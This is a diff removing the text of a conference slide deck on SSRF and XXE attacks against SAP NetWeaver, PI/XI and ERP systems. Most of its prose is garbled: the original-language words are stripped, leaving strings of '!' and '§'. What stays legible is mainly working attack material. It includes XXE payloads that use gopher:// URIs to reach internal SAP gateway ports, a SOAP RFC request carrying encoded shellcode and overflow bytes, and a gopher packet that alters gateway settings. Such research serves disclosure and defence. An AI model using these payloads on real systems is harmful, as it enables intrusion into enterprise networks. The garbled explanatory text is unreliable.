@@ -1,333 +1,0 @@
- ID! !
-
-SSRF !
-Alexander Polyakov
-ERPScan
- ID! !
-
-Alexander Polyakov
-!
-
-!
-§ !
-§  ! § ! § !
-§ SSRF !
-§ ! § ! § XXE !
-§  SSRF  SAP!
-§ ! § ! § !
-§ ! !
-
-!
-! 
- ERP     ERP  !
-
-!
-§  ! ! § ! ! §  IDS !
-§ !
-!
-
-!
-
-!
-Internet!
-!
-
-!
-
-ERP !
-
-!
-
-
-
-Internet
-
-
-
-ERP 
-
-
-
-!
-
-! Internet!
-!
-
-!
-
-ERP !
-
-!
-
-SSRF  
-
-SSRF !
-§ SSRF  Server Side Request Forgery  !
-§ 2008   !
-§ SSRF  SSRF   !
-!
-
-SSRF !
-§  A  A §  A  B  B! § ! §  A  B ! §  SSRF 
- B ! !
- A  B
-
-SSRF  !
-!
-
-!
-
- B
-
- SSRF
-! !
-§ ! §  !
-!
-
-SSRF  !
-!
-§  SSRF
-!
-§  SSRF IP 
-!
-§  SSRF !
-§  SSRF !
-§  SSRF!
-
- SSRF !
-§   !
-§ RDBMS  ERP  !
-§  !
-§  SQL !
-§ !
-§ SAP NetWeaver ! § Oracle ! § MsSQL !
-
-SSRF SAP
-§ SAP NetWeaver ! §  SM59 ! §  RFC ! § ! §  SAP_ALL ! !
-!
- TST   PRD  !
-
- SSRF!
-§ !
-§  ! § ! §  ! § !
-§  !
-§ ! § ! ! !
-
- SSRF
-! § ! § 
-! §  localhost ! §  3 
- SSRF!
-!
-! !
-
- SSRF!
-
-!
- !  B !
- IP! !
- !
-
- !
-
-!
-
-!
-
-!
-
- B !  B !
-
- IP !
- !
-
- IP !
- !
-
- SSRF!
-!
-§  IP !
-§ !
-§ SAP NetWeaver wsnavigatorSAP Note 1394544871394! § SAP NetWeaver ipcpricing (SAP Note 1545883)! § SAP BusinessObjects viewrpt (SAP Note 1432881)!
-! !
-
- SSRF ipcpricing !
-§  Internet ! § ! § SAP NetWeaver J2EE  !
-/ipcpricing/ui/BufferOverview.jsp?
-server=172.16.0.13 & port=31337 & dispatcher= & targetClient= & view=
-  
-
- SSRF ipcpricing !
-
-!
-
-HTTP !
-
-!
-
-SAP !
-
- SSRF
-!
-§ ! § ! § ! § SMBRelay! §  HTTP ! §  XXE  !
-! !
-
- SSRF  HTTP !
-§  HTTP URL !
-§ ! § ! § RFC ! § Web !
-§  !
-! !
-
- SSRF HTTP !
-
-
- GET /vuln.jsp
-SSRF 
-
-HTTP 
-SSRF       Get  /vuln.jst    
-
-192.168.0.1
-
-172.16.0.1
-
- XXE !
-!
-§  XXE HTTP ! !
-<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [
-<!ELEMENT foo ANY > <!ENTITY xxe1 SYSTEM "http://172.16.0.1:80/someservice" >]>
-<foo>&xxe1;</foo>
-! § 
-! !
-
-SAP  XXE !
-§ SAP  XML ! §  XXE  ! § SAP ! § ! § !
-
-SAP  DilbertMSG Web  J!
-§ DilbertMSG Web !
-§  Soap XML ! §  SAP PI 7.1 
-! § ! §  SAP Note 1707494 !
-
-!
-§  XXE  HTTP  UNC ! § !
-§ ftp://! § ldap://! § jar://! § gopher://! § mailto://! § ssh2://!
-§   SSRF!
-§ ......! !
-
-Gopher URI !
-<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY date SYSTEM "gopher://172.16.0.1:3300/AAAAAAAAA" >]> <foo>&date;</foo>
-  
-
-XXE !
-
-POST /XISOAPAdapter/servlet/ com.sap.aii.af.mp.soap.web.DilbertMSG? format=post HTTP/1.1 192.168.0.1:8000
-<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY date SYSTEM "gopher:// 172.16.0.1:3300/AAAAAAAAA" >]> <foo>&date;</foo>
-
- A XI ! 192.168.0.1
-
- BERP HRBW !
- 3300  
-
-AAAAAAAAAAAAA  
-
-telnet  172.16.0.1  3300  
-
-172.16.0.1
-
- XXE   SAP!
-
- SSRF !
-§ ! !
-§  SAP  !
-§  SAP !
-§ !
-
- SAP  !
-§ Virtual Forge  ABAP   (SAP Note 1487330)!
-§  RFC  RFC  !
-§ ! § !
-
- XXE  1!
-!
-§  RFC   RFC !
-§  WEBRFC ! §  SAP Note 865853  1394100 ! § WEBRFC  Internet 
-40%  NetWeaver ABAP  !
-!
-
- XXE  2!
-§ Shellcode  255 ! §  Internet 
- DNS  shellcode  ! §  XML  XML  RWX  ! §  egghunter! §  shellcode ! !
-
- XXE  B !
-POST /sap/bc/soap/rfc?sap-client=000 HTTP/1.1 Authorization: Basic U1FQKjouMjA2NTk5Mi== Host: company.com:80 User-Agent: ERPSCAN Pentesting tool v 0.2 Content-Type: text/xml; charset=utf-8 Cookie: sap-client=000 Content-Length: 2271 <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://
-schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><SOAP-ENV:Body><m:RSPO_R_SAPGPARAM xmlns:m="urn:sapcom:document:sap:rfc:functions"><HEAP_EGG>dsecdsechffffk4diFkDwj02Dwk0D7AuEE4y4O3f2s3a064M7n2M0 e0P2N5k054N4r4n0G4z3c4M3O4o8M4q0F3417005O1n7L3m0Z0O0J4l8O0j0y7L5m3E2r0b0m0E1O4w0Z3z3B4Z 0r2H3b3G7m8n0p3B1N1m4Q8P4s2K4W4C8L3v3U3h5O0t3B3h3i3Z7k0a0q3D0F0p4k2H3l0n3h5L0u7k3P2p0018 058N0a3q1K8L4Q2m1O0D8K3R0H2v0c8m5p2t5o4z0K3r8o0S4s0s3y4y3Z5p0Y5K0c053q5M0h3q4t3B0d0D3n4N 0G3p082L4s1K5o3q012s4z2H0y1k4C0B153X3j0G4n2J0X0W7o3K2Z2C0j2N4j0x2q2H4S0w030g323h3i127N165 n3Z0W4N390Y2q4z4o2o3r0U3t2o0a3p4o3T0x4k315N3i0I3q164I0Q0p8O3A07040M0A3u4P3A7p3B2t058n3Q02 VTX10X41PZ41H4A4K1TG91TGFVTZ32PZNBFZDWE02DWF0D71DJE5I4N3V6340065M2Z6M1R112NOK066N 5G4Z0C5J425J3N8N8M5AML4D17015OKN7M3X0Z1K0J388N0Z1N0MOL3B621S1Q1T1O5GKK3JJO4P1E0X42 3GMMNO6P3B141M4Q3A5C7N4W4C8M663U485HK03B49499J2Z0V1F3EML0QJK2O482N494M1D173Q11001 8049N7J401K9L9X101O0N3Z450J161T5M90649U4ZMM3S9Y1C5C1C9Y3S3Z300Y5K1X2D9P4M6M9T5D3B1T 0D9N4O0M3T082L5D2KOO9V0J0W5J2H1N7Z4D62LO3H9O1FJN7M0Y1PMO3J0G2I1ZLO3D0X612O4T2C010 G353948137O074X4V0W4O5Z68615JJOLO9R0T9ULO1V8K384E1HJK305N44KP9RKK4I0Q6P3U3J2F032J0A9 W4S4Q2A9U69659R4A06aaaaaaaaaaaaaaaaaaaaa</ HEAP_EGG><NAME>&#186;&#255;&#255;&#206;&#060;&#102;&#129;&#202;&#255;&#015;&#066;&#082;&#10 6;&#067;&#088;&#205;&#046;&#060;&#005;&#090;&#116;&#239;&#184;&#100;&#115;&#101;&#099;&#139;&#25 0;&#175;&#117;&#234;&#175;&#117;&#231;&#255;&#231;&#144;&#144;&#144;AAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#158;&#14;&#190;&#171;DSEC&#094;&#023;&#015;&#0 01;&#252;&#049;&#043;&#001;&#212;&#083;&#242;&#000;&#018;&#058;&#071;&#000;&#250;&#047;&#057;&#0 16;&#076;&#255;&#084;&#000;&#001;&#002;&#000;&#000;&#226;&#020;&#095;&#000;&#064;&#000;&#000;&#0 00;&#097;&#125;&#088;&#016;&#115;&#167;&#113;&#002;&#117;&#218;&#157;&#000;&#004;&#128;&#069;&#0 00;&#082;&#089;&#012;&#016;&#235;&#004;&#235;&#002;&#134;&#027;&#198;&#000;&#255;&#255;&#233;&#0 77;&#255;&#255;&#255;&#255;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAA</NAME></m:RSPO_R_SAPGPARAM></SOAP-ENV:Body></SOAPENV:Envelope>
-
- XXE  3!
-§  B  A  ! §  ! §  gopher urlencode HTTP! §  IDS ! ! !
-POST  /XISOAPAdapter/servlet/com.sap.aii.af.mp.soap.web.DilbertMSG?format=post  HTTP/1.1   Host:  sapserver.com:80 Content--Length:  7730      <?xml  version="1.0"  encoding="ISO--8859--1"?>     <!DOCTYPE  foo  [       <!ELEMENT  foo  ANY  >     <!ENTITY  date  SYSTEM  "gopher://[Urlencoded  Packet  B]"  >]>     <foo>&date;</foo>  
-
- XXE !
-
-POST /XISOAPAdapter/servlet/ com.sap.aii.af.mp.soap.web.DilbertMSG ?format=post HTTP/1.1 Host: company.com: 80
-<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY date SYSTEM "gopher:// 172.16.0.1:3300/[Packet B]" >]> <foo>&date;</foo>
-
-Internet  A! (SAP XI) !
-
-http://company.com
-
- 172.16.0.1  8000  B!
-
-DMZ  B (SAP ERP)!
- 8000 webrfc
- DNS  Shellcode
-!
-172.16.0.1
-
- C ­  DNS 
-!
-
- Internet !
-
- SAP !
- SAP  !
-!
-§ SAP ! § SAP ! § Oracle ! § !
-
-SAP !
-§ SAP  ­ SAP ! §  RFC ! §  gw/monitor  !
-§ 0! § 1! § 2! §  XXE ! §  SAP !
-
- SAP 
- Gopher ! 1.  Urlencode ! 2. Gopher !
-§   !
-3.  8A  99 !
-§ ! §  !
-4.  88 77!
-!
-
- SAP !
-POST /XISOAPAdapter/servlet/com.sap.aii.af.mp.soap.web.DilbertMSG?format=post HTTP/1.1
-Host: 172.16.10.63:8001 Content-Length: 621
-<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE in [<! ENTITY ltt SYSTEM "gopher://172.16.0.1:3301/a %00%00%00%7A%43%4F%4E%54%00%02%00%7A %67%77%2F%6D%61%78%5F%73%6C %65%65%70%00%00%00%00%79%02%00%00%00%00 %00%00%28%DE%D9%00%79%5F %00%74%08%B5%38%7C%00%00%00%00%44%DE %D9%00%00%00%00%00%00%00%00%00%70%DE %D9%00%00%00%00%00%EA%1E %43%00%08%38%38%00%00%00%00%00%10%43%59 %00%18%44%59%00%00%00%00%00%64%DE %D9%00%79%5F%00%74%08%B5%38%7C %00%00%00%00%79%DE%D9%00%00%00%00%7A %DE%D9%00%B3%56%35%7C%48%EF%38%7C%5F %57%35%7C%0A%00%00%00%B8%EE">] ><dmsg:generate xmlns:dmsg='http://sap.com/fun/dilbert/ msg' title='&ltt;'>1</dmsg:generate>
-
-!
-§  SAP !
-§ ABAP  10 ! § J2EE  20 ! § 20  !
-§  !
-§ ! §  ACL ! § ! § !
-!
-
-!
-§  XML  127.0.0.1  !
-§ ! § !
-§ ""!
-
-!
-§ SSRF ! § ! §  Gopher ! §  SAP J2EE ! § ! § ERPScan  SAP  SAP
-! §  Oracle JRE !
-
-www.erpscan.com info@erpscan.com 
-TwiZer@erpscan  @sh2kerr
-
-!
-
-
